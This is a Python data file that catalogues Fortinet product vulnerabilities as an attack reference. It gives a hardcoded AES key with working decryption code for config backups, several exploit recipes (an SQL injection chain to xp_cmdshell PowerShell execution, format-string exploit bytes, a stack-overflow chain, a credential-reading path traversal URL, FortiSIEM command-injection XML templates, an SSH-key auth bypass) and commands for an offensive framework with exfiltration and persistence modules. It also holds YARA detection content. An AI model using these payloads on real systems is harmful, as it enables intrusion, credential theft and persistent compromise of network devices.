"""
Fortinet CVE PoC extra, Metasploit modules, threat intelligence RE
Sources:
  - cve-pocs-extra/: CVE-2019-6693, CVE-2020-9289, CVE-2023-48788, CVE-2024-23113,
                     CVE-2025-32756, Fortinet-Hunter-2026
  - msf-modules/: 10 Metasploit modules
  - threat-intel/: COATHANGER YARA, Mandiant BOLDMOVE, JSCU advisory
  - horizon3ai-pocs/: CVE-2023-34992, CVE-2024-23108, CVE-2025-64155
"""

# ---------------------------------------------------------
# Hardcoded AES key: CVE-2019-6693 + CVE-2020-9289
# ---------------------------------------------------------
FORTIOS_HARDCODED_AES_KEY = {
    "id":       "FKEY-AES",
    "product":  "FortiOS / FortiManager -- universal config backup AES key",
    "cves":     ["CVE-2019-6693", "CVE-2020-9289"],
    "severity": "HIGH -- all config backups decryptable with known static key",
    "class":    "Use of hard-coded cryptographic key (CWE-321)",

    "key":      b"Mary had a littl",
    "key_hex":  "4d61727920686164206120 6c697474 6c",
    "key_len":  16,
    "mode":     "AES-128-CBC",

    "cve_2019_6693": {
        "product":  "FortiOS -- FortiGate config backup files",
        "iv_construction": "data[0:4] + b'\\x00' * 12  (4 bytes from blob + 12 zero bytes = 16B IV)",
        "ciphertext":      "data[4:]",
        "decrypt": (
            "import base64; from Cryptodome.Cipher import AES; "
            "data = base64.b64decode(encrypted_password); "
            "iv = data[0:4] + b'\\x00'*12; ct = data[4:]; "
            "cipher = AES.new(b'Mary had a littl', AES.MODE_CBC, iv); "
            "pt = cipher.decrypt(ct).rstrip(b'\\x00')"
        ),
        "scope": (
            "FortiOS config backup 'set passwd ENC <base64>' values. "
            "FortiOS HA passwords 'set password ENC <base64>'. "
            "FortiManager encrypted fields. "
            "Any FortiOS/FortiManager backup file exported via GUI or CLI."
        ),
    },

    "cve_2020_9289": {
        "product":  "FortiManager -- encrypted secret fields",
        "iv_construction": "data[0:16]  (full 16 bytes; different from 2019-6693)",
        "ciphertext":      "data[16:]",
        "padding":  "last encrypted block is garbage; last 16 bytes of plaintext truncated unless padded",
        "decrypt": (
            "data = base64.b64decode(b64_val); "
            "iv = data[0:16]; ct = data[16:]; "
            "elen = len(ct) % 16; "
            "if elen: ct += b'\\x00'*(16-elen); "
            "pt = AES.new(b'Mary had a littl', AES.MODE_CBC, iv).decrypt(ct); "
            "if elen: pt = pt[:-16]"
        ),
    },

    "note": (
        "The key 'Mary had a littl' is a nursery-rhyme excerpt chosen to be exactly 16 bytes. "
        "The key has not changed across FortiOS versions 5.x-7.x -- every backup file from "
        "every FortiGate in the wild is decryptable offline. "
        "The FH_FORTIOS_PDE_KEY environment variable in Fortinet-Hunter-2026 allows overriding "
        "this key for per-device decryption, suggesting some newer firmware may vary the key."
    ),
}


# ---------------------------------------------------------
# CVE-2023-48788: FortiClientEMS SQLi to RCE (FCTUID)
# ---------------------------------------------------------
CVE_2023_48788 = {
    "id":       "FEI-SQLI",
    "product":  "Fortinet FortiClientEMS -- FCTUID header SQLi to SYSTEM RCE",
    "cve":      "CVE-2023-48788",
    "cvss":     "9.8 (Critical) -- unauthenticated MSSQL injection via registration message",
    "class":    "SQL injection in registration handler (CWE-89)",
    "port":     8013,
    "protocol": "TCP, TLS; FortiClient registration protocol (FCCK)",

    "vuln_description": (
        "FcmDaemon.exe (FortiClient EMS main service, port 8013) receives FortiClient "
        "endpoint registration messages. The `FCTUID=` field in the MSG_HEADER is "
        "directly interpolated into an MSSQL query by FCTDas.exe without parameterization. "
        "The SQLi enables: xp_cmdshell toggle -> OS command execution as NT AUTHORITY\\SYSTEM. "
        "Affected: FortiClientEMS 7.0.1-7.0.10, 7.2.0-7.2.2."
    ),

    "wire_format": (
        "TLS-wrapped message over TCP 8013. "
        "Header: 'MSG_HEADER: FCTUID=<value>\\n' "
        "followed by IP=, MAC=, FCT_ONNET=, CAPS=, VDOM=, SIZE= fields, "
        "then '\\r\\n\\r\\n' + 'X-FCCK-REGISTER: SYSINFO||<base64_sysinfo>\\nX-FCCK-REGISTER-END'."
    ),

    "injection_point": "FCTUID= in MSG_HEADER -- directly concatenated into MSSQL query",
    "injection_payload": "' OR 1=1 -- (SQLi detection); ' ; EXEC xp_cmdshell('<cmd>') -- (RCE)",

    "rce_chain": (
        "1. Send FCTUID=' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --  "
        "2. Send FCTUID=' ; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --  "
        "3. Send FCTUID=' ; EXEC xp_cmdshell('powershell -e <b64_payload>'); --  "
        "Result: command runs as NT AUTHORITY\\SYSTEM (MSSQL service account)."
    ),

    "note": (
        "At least one enrolled endpoint must exist for FcmDaemon.exe to accept registrations "
        "(service starts only when an endpoint has checked in). "
        "The MSF module (forticlient_ems_sqli.rb) supports FortiClientEMS 7.0 and 7.2 versions "
        "with different SYSINFO payloads. The detection check probes for "
        "'KA_INTERVAL' in the 200 response."
    ),
}


# ---------------------------------------------------------
# CVE-2024-23113: FGFM format string (port 541)
# ---------------------------------------------------------
CVE_2024_23113 = {
    "id":       "FGFM-FMT",
    "product":  "Fortinet FortiOS / FortiProxy / FortiPAM / FortiWeb -- FGFM format string",
    "cve":      "CVE-2024-23113",
    "cvss":     "9.8 (Critical) -- unauthenticated RCE via format string",
    "class":    "Format string vulnerability in FGFM protocol handler (CWE-134)",
    "port":     541,
    "protocol": "FGFM (FortiGate-to-FortiManager) over TLS",

    "vuln_description": (
        "The FGFM protocol handler processes authentication reply messages. "
        "The `authip=` field in the reply block is used in a printf-style function "
        "without sanitization. Sending `authip=%n` causes a write-what-where condition "
        "via the `%n` format specifier, leading to arbitrary code execution."
    ),

    "wire_format": (
        "TLS over TCP 541. "
        "Server sends: pkt_flags (4B little-endian) + pkt_len (4B big-endian) + initial_data. "
        "Client sends: 0x0001e034 (4B little-endian magic) + (payload_len+8) (4B big-endian) "
        "+ payload. "
        "Exploit payload: 'reply 200\\r\\nrequest=auth\\r\\nauthip=%n\\r\\n\\r\\n\\x00'"
    ),

    "format_string_bytes": b"reply 200\r\nrequest=auth\r\nauthip=%n\r\n\r\n\x00",

    "note": (
        "The PoC sends a single formatted message and watches for TLS abort. "
        "A crash (SSLError with 'unexpected message') indicates the format string "
        "hit a %n write and corrupted process memory. "
        "Full weaponization requires stack leak to compute ASLR offset, "
        "then %n to overwrite a return address or GOT entry."
    ),
}


# ---------------------------------------------------------
# CVE-2025-32756: FortiVoice/FortiMail/FortiNDR/FortiCamera stack overflow
# ---------------------------------------------------------
CVE_2025_32756 = {
    "id":       "FV-STKOF",
    "product":  "FortiVoice / FortiMail / FortiNDR / FortiCamera / FortiRecorder -- stack overflow",
    "cve":      "CVE-2025-32756",
    "cvss":     "9.8 (Critical) -- unauthenticated RCE via /remote/hostcheck_validate",
    "class":    "Stack-based buffer overflow in SSLVPN host check handler (CWE-121)",
    "port":     443,
    "endpoint": "POST /remote/hostcheck_validate",

    "vuln_description": (
        "The /remote/hostcheck_validate endpoint processes an `enc=` POST parameter "
        "containing an encrypted payload. The decryption routine uses a stream cipher "
        "(MD5-based keystream) with a length field embedded in the encrypted blob. "
        "The decrypted length is not validated against the receiving stack buffer size. "
        "Sending an encrypted payload where the embedded length (e.g., 5000) exceeds "
        "the stack buffer triggers a controllable stack overflow."
    ),

    "encryption_scheme": {
        "key_derivation":   "salt (from /remote/info) + seed (attacker-controlled) + 'GCC is the GNU Compiler Collection.'",
        "initial_state":    "MD5(salt + seed + 'GCC is the GNU Compiler Collection.')",
        "keystream_gen":    "loop: next_state = MD5(prev_state); keystream += next_state",
        "length_encoding":  "enc_len[0] = (target_len & 0xFF) XOR keystream[0]; enc_len[1] = (target_len >> 8) XOR keystream[1]",
        "payload_encoding": "enc_data[i] = data[i] XOR keystream_for_data[i]",
    },

    "exploit_chain": (
        "1. GET /remote/info -> extract salt (e.g., 'e0b638ac'). "
        "2. Choose seed (e.g., '00690000'). "
        "3. Compute initial_state = MD5(salt + seed + 'GCC is...'). "
        "4. Generate keystream from initial_state (MD5 chaining). "
        "5. Encode target_length = 4999 with keystream[0:2] -> first request (primes state). "
        "6. Encode target_length = 5000 with same keystream -> second request triggers overflow. "
        "7. POST /remote/hostcheck_validate enc=<url_encoded_payload>."
    ),

    "affected_products": [
        "FortiVoice (telco/enterprise IP PBX; port 443 HTTPS)",
        "FortiMail (email security gateway)",
        "FortiNDR (network detection and response)",
        "FortiCamera (IP camera management)",
        "FortiRecorder (video recorder management)",
    ],

    "note": (
        "The PoC in cve-pocs-extra uses a hardcoded salt 'e0b638ac' and seed '00690000'. "
        "A real exploit must fetch the salt dynamically from /remote/info. "
        "The PoC is a demonstration; it does not contain ROP chains or shellcode. "
        "The overflow is at the length-decode step (not at memcpy): the decrypted size "
        "is used as the argument to a stack-allocating function, causing stack exhaustion "
        "or a smash of the saved return address depending on compiler behavior."
    ),
}


# ---------------------------------------------------------
# CVE-2016-1909: FortiOS/FortiManager SSH backdoor
# ---------------------------------------------------------
CVE_2016_1909 = {
    "id":       "FSSH-BACK",
    "product":  "Fortinet FortiOS / FortiManager -- hardcoded SSH backdoor account",
    "cve":      "CVE-2016-1909",
    "cvss":     "10.0 (Critical) -- authenticated remote access with no password",
    "class":    "Use of hard-coded credentials (CWE-798)",
    "port":     22,
    "protocol": "SSH",

    "backdoor_account": "Fortimanager_Access",
    "auth_method":      "fortinet-backdoor (custom SSH auth method, no password required)",

    "description": (
        "FortiOS and FortiManager contained a hardcoded SSH management account "
        "'Fortimanager_Access' accessible with a special authentication method. "
        "The authentication does not require a password -- the auth_method identifier "
        "itself serves as the credential. "
        "Successfully connecting as this account grants a management shell. "
        "The MSF module (fortinet_ssh_backdoor.rb) uses Net::SSH with "
        "auth_methods: ['fortinet-backdoor'] to authenticate as Fortimanager_Access."
    ),

    "msf_module": "msf-modules/fortinet_ssh_backdoor.rb",
    "affected": "FortiOS 4.x, 5.x (pre-patch); FortiManager (certain versions)",
}


# ---------------------------------------------------------
# CVE-2022-40684: FortiOS API auth bypass
# ---------------------------------------------------------
CVE_2022_40684 = {
    "id":       "FAPI-BYPASS",
    "product":  "Fortinet FortiOS / FortiProxy / FortiSwitchManager -- API authentication bypass",
    "cve":      "CVE-2022-40684",
    "cvss":     "9.8 (Critical) -- unauthenticated admin API access",
    "class":    "Authentication bypass in REST API (CWE-287)",
    "port":     443,

    "description": (
        "The FortiOS CMDB REST API (/api/v2/cmdb/) allows an attacker to impersonate "
        "any administrative account by sending requests with a crafted User-Agent or "
        "X-Forwarded-For header. The API server validates the session token against "
        "a table that can be bypassed via the Trusted Access forwarded-proxy mechanism. "
        "Result: full administrative access to FortiOS without credentials."
    ),

    "exploit_chain": (
        "1. Identify a valid admin username (default: 'admin'). "
        "2. PUT /api/v2/cmdb/system/admin/<username> with crafted User-Agent "
        "   'Report Runner' or X-Forwarded-For 127.0.0.1 header. "
        "3. Add SSH authorized_keys entry for attacker-controlled key. "
        "4. SSH in as the admin user using the added key."
    ),

    "msf_module": "msf-modules/fortios_auth_bypass_40684.rb",
    "note": (
        "The bypass was specifically exploited in the wild before patch. "
        "The MSF module RPORT defaults to 443 and adds an SSH key to authorized_keys, "
        "providing a persistent interactive session."
    ),
}


# ---------------------------------------------------------
# CVE-2018-13379: FortiOS SSL-VPN path traversal (websession creds)
# ---------------------------------------------------------
CVE_2018_13379 = {
    "id":       "FVPN-TRAV",
    "product":  "Fortinet FortiOS SSL-VPN -- path traversal to plaintext credential read",
    "cve":      "CVE-2018-13379",
    "cvss":     "9.8 (Critical) -- unauthenticated credential theft",
    "class":    "Path traversal in SSL-VPN web portal (CWE-22)",
    "port":     10443,
    "endpoint": "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",

    "description": (
        "The FortiOS SSL-VPN web portal allows path traversal in the lang= parameter "
        "of the /remote/fgt_lang endpoint. An attacker can traverse to arbitrary "
        "filesystem paths. The file /dev/cmdb/sslvpn_websession stores plaintext "
        "credentials (username + password) for all currently active SSL-VPN sessions. "
        "This was mass-exploited in 2020-2021; a 2021 Fortibleed dataset of 87,000 "
        "FortiGate credentials was published from this vulnerability."
    ),

    "traversal_path":   "/../../../..//////////dev/cmdb/sslvpn_websession",
    "msf_module":       "msf-modules/fortios_vpnssl_creds_leak.rb",
    "affected":         "FortiOS 5.4.6-5.4.12, 5.6.3-5.6.7, 6.0.0-6.0.4",

    "fortibleed_corpus": (
        "The Fortibleed leak (2021) contained ~87,000 IP:port:username:password tuples "
        "harvested via this vulnerability. Fortinet-Hunter-2026 includes a FortiBleedCorpus "
        "class in fortinet_hunter/recon/fortibleed.py that loads and queries this corpus. "
        "The Belsen 2025 leak (MX/LATAM devices) is also referenced in the brute module "
        "(resources/Belsen-leak/) and contains FortiGate VPN credentials."
    ),
}


# ---------------------------------------------------------
# CVE-2022-39952: FortiNAC keyUpload.jsp arbitrary file write
# ---------------------------------------------------------
CVE_2022_39952 = {
    "id":       "FNAC-FWRITE",
    "product":  "Fortinet FortiNAC -- keyUpload.jsp ZIP extraction path traversal to RCE",
    "cve":      "CVE-2022-39952",
    "cvss":     "9.8 (Critical) -- unauthenticated file write -> root RCE",
    "class":    "Arbitrary file write via ZIP extraction path traversal (CWE-22)",
    "port":     8443,
    "endpoint": "POST /configWizard/keyUpload.jsp",

    "description": (
        "The keyUpload.jsp endpoint accepts a ZIP file without authentication. "
        "ZIP entry filenames are not sanitized before extraction. "
        "An attacker sends a ZIP with an entry named '../../etc/cron.d/evil' "
        "containing a cron job payload. "
        "The cron job executes as root (cron runs as root on FortiNAC). "
        "MSF module: drop payload to /tmp/ + cron to /etc/cron.d/ -> root shell."
    ),

    "msf_module":   "msf-modules/fortinac_file_write.rb",
    "affected":     "FortiNAC 8.3-8.8 (all), 9.1.0-9.1.7, 9.2.0-9.2.5, 9.4.0",
}


# ---------------------------------------------------------
# FortiSIEM Phoenix Monitor injection series (TCP 7900)
# ---------------------------------------------------------
FORTISIEM_PHOENIX_MONITOR = {
    "id":       "FSIEM-PHMON",
    "product":  "Fortinet FortiSIEM -- Phoenix Monitor TCP 7900 injection series",
    "cves":     ["CVE-2023-34992", "CVE-2024-23108", "CVE-2025-64155", "CVE-2025-25256"],
    "cvss":     "10.0 (Critical) -- unauthenticated command injection on all four",
    "class":    "OS command injection in unauthenticated management protocol (CWE-78)",
    "port":     7900,
    "protocol": "TCP TLS; Phoenix Monitor management protocol",

    "wire_format": {
        "header":           "4 bytes (little-endian): cmd_type | 4 bytes (little-endian): payload_len | 4 bytes: magic 0x40210276 | 4 bytes: 0x00000000",
        "magic":            "0x40210276 = 1075724911 (same across all four CVEs; no auth token)",
        "encoding":         "XML payload; no authentication field; no session token",
    },

    "injection_fields": {
        "CVE-2023-34992": {
            "cmd_type":    "81 (TEST_STORAGE)",
            "xml_template": "<TEST_STORAGE type='nfs'><server_ip>127.0.0.1; {cmd};</server_ip><mount_point>/test</mount_point></TEST_STORAGE>",
            "inject_field": "server_ip -- semicolon injection into shell command",
            "space_bypass": "none required (semicolons work in server_ip field)",
        },
        "CVE-2024-23108": {
            "cmd_type":    "81 (TEST_STORAGE)",
            "xml_template": "<TEST_STORAGE type='nfs'><server_ip>127.0.0.1</server_ip><mount_point>/lala; {cmd};</mount_point></TEST_STORAGE>",
            "inject_field": "mount_point -- second injection field in same TEST_STORAGE handler",
            "note":         "Different field within same cmd_type=81; CVE-2024-23108 is the bypass for CVE-2023-34992 patch",
        },
        "CVE-2025-64155": {
            "cmd_type":    "156 (TEST_STORAGE elastic)",
            "xml_template": "<TEST_STORAGE type='elastic'><cluster_url>http://IP:PORT --next -o /opt/charting/redishb.sh http://IP:PORT</cluster_url>...</TEST_STORAGE>",
            "inject_field": "cluster_url -- curl argument injection (--next -o writes arbitrary file)",
            "mechanism":    "/opt/phoenix/phscripts/bin/elastic_test_url.sh calls curl with cluster_url; --next -o writes response to attacker-controlled path",
        },
        "CVE-2025-25256": {
            "cmd_type":    "90 (ARCHIVE_REQUEST)",
            "xml_template": "<root><archive_storage_type>nfs</archive_storage_type><archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip><archive_nfs_archive_dir>`{cmd}`</archive_nfs_archive_dir><scope>local</scope></root>",
            "inject_field": "archive_nfs_archive_dir -- backtick injection",
            "space_bypass": "${IFS} substitutes for space characters",
        },
    },

    "systemic_note": (
        "All four CVEs target the same unauthenticated Phoenix Monitor service on TCP 7900. "
        "The service has no authentication (magic value 1075724911 is the universal 'session token'). "
        "Four distinct injection fields have been discovered across three cmd_type values (81, 90, 156). "
        "This is a single architectural failure: the service executes attacker-supplied strings "
        "as shell commands without sanitization, across multiple handler functions. "
        "The pattern strongly suggests additional unpatched injection fields exist in other "
        "cmd_type handlers -- the surface has not been fully mapped."
    ),
}


# ---------------------------------------------------------
# COATHANGER: APT29/Chinese APT FortiOS rootkit
# ---------------------------------------------------------
COATHANGER_MALWARE = {
    "id":       "TI-COATHANGER",
    "product":  "COATHANGER -- Chinese state APT FortiOS persistent rootkit",
    "source":   "threat-intel/COATHANGER_advisory.pdf (JSCU/MIVD 2024-02-06)",
    "actor":    "Chinese state-sponsored threat actor (MIVD/AIVD attribution)",
    "target":   "Dutch Ministry of Defence (COATHANGER campaign 2022-2023)",

    "persistence_mechanism": (
        "COATHANGER writes to /etc/ld.so.preload to preload a malicious shared library "
        "(/data2/preload.so) into every process. "
        "This achieves: "
        "  1. Hooking of system calls (read, open, stat, lstat) to hide files/processes. "
        "  2. Survival across firmware upgrades (preload.so is re-injected by a helper). "
        "  3. Backdoor shell accessible via the /httpsd process."
    ),

    "yara_rules": {
        "MAL_Fortinet_COATHANGER_Beacon": {
            "description": "Detects COATHANGER beaconing code",
            "signature":   "bytes: 48 B8 47 45 54 20 2F 20 48 54  --> movabs rax, 0x5448 2F205445472047 (GET / HTTP)",
            "full_bytes":  "48 B8 47 45 54 20 2F 20 48 54 48 89 45 B0 48 B8 54 50 2F 32 0A 48 6F 73 48 89 45 B8 48 B8 74 3A 20 77 77 77 2E 67 48 89 45 C0 48 B8 6F 6F 67 6C 65 2E 63 6F",
            "decoded":     "'GET / HTTP/2\\nHost: www.google.co' -- beacon camouflage string (Google HTTP/2 request to disguise C2)",
            "condition":   "ELF magic (uint32(0)==0x464c457f) + filesize < 5MB",
        },
        "MAL_Fortinet_COATHANGER_Files": {
            "description": "Detects COATHANGER by characteristic file paths",
            "strings": [
                "/data2/",
                "/httpsd",
                "/preload.so",
                "/authd",
                "/tmp/packfile",
                "/smartctl",
                "/etc/ld.so.preload",
                "/newcli",
                "/bin/busybox",
            ],
            "condition": "(ELF magic) AND (filesize < 5MB) AND (4 of the strings)",
        },
    },

    "note": (
        "The beacon string disguises C2 traffic as Google HTTPS keepalives. "
        "The movabs rax pattern (0x48 0xB8 + 8 bytes) is the same Rust/LLVM inline-string "
        "optimization seen in certd -- x86-64 loads 8 bytes as a 64-bit immediate. "
        "COATHANGER's use of /etc/ld.so.preload + /data2/ is the standard FortiOS persistence path "
        "(same /data2/bfbin/ used in CVE-2021-44168 LD_PRELOAD exploit)."
    ),
}


# ---------------------------------------------------------
# BOLDMOVE: Mandiant-tracked FortiOS malware family
# ---------------------------------------------------------
BOLDMOVE_MALWARE = {
    "id":       "TI-BOLDMOVE",
    "product":  "BOLDMOVE -- Chinese APT FortiOS implant (Mandiant, 2022)",
    "source":   "threat-intel/BOLDMOVE_mandiant_report.pdf",
    "actor":    "Chinese state APT (Mandiant UNC attribution)",
    "target":   "European and Middle East government targets via FortiOS SSLVPN",

    "note": (
        "BOLDMOVE is a Linux and Windows backdoor exploiting CVE-2022-42475 (FortiOS SSLVPN heap overflow). "
        "The Linux variant targets FortiOS specifically -- it reads from FortiOS-specific paths "
        "(/proc/fortimerge, /etc/version) and has built-in knowledge of FortiOS memory layout. "
        "BOLDMOVE and COATHANGER represent two distinct toolchains both targeting FortiOS, "
        "both attributed to Chinese state actors, both using CVE chains starting from SSLVPN RCE."
    ),
}


# ---------------------------------------------------------
# Fortinet-Hunter-2026: full attack framework
# ---------------------------------------------------------
FORTINET_HUNTER_2026 = {
    "id":       "FH-2026",
    "product":  "Fortinet-Hunter-2026 -- open-source Fortinet attack framework (YogSotho/BrokenSec)",
    "source":   "cve-pocs-extra/Fortinet-Hunter-2026/",
    "version":  "v2026.08",
    "scale":    "97 plugins, 58 CVEs, 809 test suite, 32 subtests",

    "module_map": {
        "detectors":    "32 CVE detectors",
        "exploits":     "19 weaponized exploit modules",
        "exfil":        "5 exfiltration modules (vault, DNS-TXT, config, ...)",
        "lateral":      "15 lateral-movement modules",
        "recon":        "10 recon modules (including megalodon worm IOC scanner, fortibleed corpus)",
        "ops":          "evasion + passive auth sniffer + hash cracker",
        "persist":      "3 persistence modules",
        "ml":           "4 ML modules (cve_risk, anomaly, payload, success_prediction)",
        "c2":           "2 C2 channels (GitHub gist, ngrok) + Shai kit (Tor/DoH)",
        "agent":        "agentic orchestrator loop",
    },

    "capabilities_of_note": {
        "dynamic_exploit_ingestion": (
            "CLI flag --expl accepts a user-supplied Python exploit file. "
            "AST-level audit checks for BaseExploit subclass, required attrs, and banned imports. "
            "Banned imports: os, subprocess, socket, ctypes, pickle, marshal, pty, fcntl, "
            "multiprocessing, threading. "
            "The ban list is an AST string check -- easily bypassed via __import__('os') "
            "or importlib.import_module('subprocess')."
        ),
        "fortibleed_corpus": (
            "Loads the Fortibleed 830K credential corpus (87,000+ IP:cred pairs from CVE-2018-13379). "
            "brute command accepts --creds file for per-device credential list (Belsen leak support)."
        ),
        "megalodon_worm": (
            "Scans for CI/CD pipeline compromise IOCs in Fortinet environments. "
            "Designed to detect worm propagation through FortiManager-managed FortiGate fleets."
        ),
        "doh_c2": (
            "RFC 8484 DoH (DNS over HTTPS) C2 channel. "
            "Tor beacon support. Designed for defender-evasion C2 communication."
        ),
        "config_decryption": (
            "FH_FORTIOS_PDE_KEY env var: per-device ENC key override for config decryption. "
            "Default key is 'Mary had a littl' (CVE-2019-6693/CVE-2020-9289)."
        ),
        "sslvpn_websession_brute": (
            "sniff command: passive auth sniffer for SSL-VPN sessions. "
            "crack command: SH2/AK1 hash cracking (hashcat backend)."
        ),
    },

    "attack_chain_commands": {
        "fingerprint":  "python3 -m fortinet_hunter scan <target>:443 --check-cve -o results/",
        "exploit":      "python3 -m fortinet_hunter exploit <cve_id> <target>:443 --dry-run",
        "chain_exfil":  "python3 -m fortinet_hunter chain sslvpn_config_exfil <target>:443",
        "fgfm_probe":   "python3 -m fortinet_hunter fgfm <target>:541",
        "osint":        "python3 -m fortinet_hunter osint --shodan --censys --fofa <query>",
        "persist":      "python3 -m fortinet_hunter persist <target>:443 --method preload",
    },
}


# ---------------------------------------------------------
# Systemic: Fortinet product line attack surface summary
# ---------------------------------------------------------
FORTINET_ATTACK_SURFACE_MAP = {
    "id":       "FSYS-MAP",
    "product":  "Fortinet product line -- complete attack surface map across all analyzed sources",

    "unauthenticated_rce_catalog": {
        "FortiOS SSLVPN (sslvpnd)": [
            "CVE-2022-42475 (heap overflow; BOLDMOVE exploitation)",
            "CVE-2023-27997 (heap overflow; pre-auth)",
            "CVE-2024-21762 (OOB write; pre-auth; active exploitation 2024)",
        ],
        "FortiOS Node.js WebSocket": [
            "CVE-2024-55591 (auth bypass via ws:// admin API)",
        ],
        "FortiOS Management API": [
            "CVE-2022-40684 (auth bypass; SSH key injection -> RCE)",
        ],
        "FortiOS FGFM port 541": [
            "CVE-2024-23113 (format string %n via authip= field)",
        ],
        "FortiOS SSH": [
            "CVE-2016-1909 (hardcoded Fortimanager_Access backdoor)",
        ],
        "FortiOS SSL-VPN path traversal": [
            "CVE-2018-13379 (sslvpn_websession plaintext creds; Fortibleed)",
        ],
        "FortiManager FGFM port 541": [
            "CVE-2024-47575 (FortiJump; cert bypass + command injection; APT-exploited)",
        ],
        "FortiSIEM Phoenix Monitor port 7900": [
            "CVE-2023-34992 (server_ip injection)",
            "CVE-2024-23108 (mount_point injection; bypass of 34992 patch)",
            "CVE-2025-64155 (elastic cluster_url curl arg injection)",
            "CVE-2025-25256 (archive_nfs_archive_dir backtick injection)",
        ],
        "FortiClientEMS port 8013": [
            "CVE-2023-48788 (FCTUID MSSQL injection -> SYSTEM RCE)",
        ],
        "FortiWeb HTTPS port 443": [
            "CVE-2025-xxxxx (URL-encoded path traversal auth bypass)",
            "CVE-2025-25257 (Bearer SQLi -> UNHEX spray -> .pth RCE)",
        ],
        "FortiVoice/FortiMail/FortiNDR/FortiCamera HTTPS port 443": [
            "CVE-2025-32756 (hostcheck_validate enc= stack overflow)",
        ],
        "FortiNAC HTTPS port 8443": [
            "CVE-2022-39952 (keyUpload.jsp ZIP traversal -> root cron)",
        ],
    },

    "credential_theft_catalog": {
        "FortiOS config backup": "CVE-2019-6693 (AES key 'Mary had a littl')",
        "FortiManager secrets": "CVE-2020-9289 (same key, different IV)",
        "FortiOS SSL-VPN sessions": "CVE-2018-13379 (plaintext sslvpn_websession)",
        "ZTNA private key": "CERTD-F01 (software fallback from TPM; disk-stored key)",
    },

    "persistence_catalog": {
        "/etc/ld.so.preload": "COATHANGER rootkit; CVE-2021-44168 LD_PRELOAD via FDS package",
        "/data2/bfbin/":      "CVE-2021-44168 tar traversal shell drop",
        "FortiManager managed FortiGates": "CVE-2024-47575 FortiJump; lateral to all managed devices",
        "ZTNA attestation chain": "CERTD-F01 software fallback; undetectable by gateway",
    },
}
